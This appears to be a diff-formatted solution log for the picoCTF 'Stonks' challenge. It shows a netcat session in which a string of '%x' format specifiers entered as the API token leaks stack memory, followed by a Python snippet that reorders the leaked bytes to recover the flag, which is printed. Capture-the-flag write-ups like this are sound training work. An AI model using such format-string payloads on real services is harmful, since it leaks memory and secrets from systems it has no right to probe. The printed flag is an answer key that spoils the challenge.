@@ -1,0 +1,38 @@
+nc mercury.picoctf.net 16439
+Welcome back to the trading app!
+
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+1
+Using patented AI algorithms to buy stonks
+Stonks chosen
+What is your API token?
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+Buying stonks with token:
+8a5a3d0804b00080489c3f7f1ed80ffffffff18a58160f7f2c110f7f1edc708a5918018a5a3b08a5a3d06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff87007df7f59af8f7f2c440eafd4d001
+Portfolio as of Mon Feb 13 05:34:44 UTC 2023
+
+
+1 shares of HUBT
+7 shares of FLI
+4 shares of I
+11 shares of BQNC
+12 shares of ATFT
+145 shares of Z
+615 shares of NKQC
+Goodbye!
+
+ocip{FTC0l_I4_t5m_ll0m_y_y3nbc7ceac6ÿ}
+
+python3
+
+>>> s='ocip{FTC0l_I4_t5m_ll0m_y_y3nbc7ceac6ÿ'
+>>> for i in range (0,len(s),4):
+...    print(s[i+3]+s[i+2]+s[i+1]+s[i], end='')
+... 
+
+picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae>>> 
+
+
+#picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}
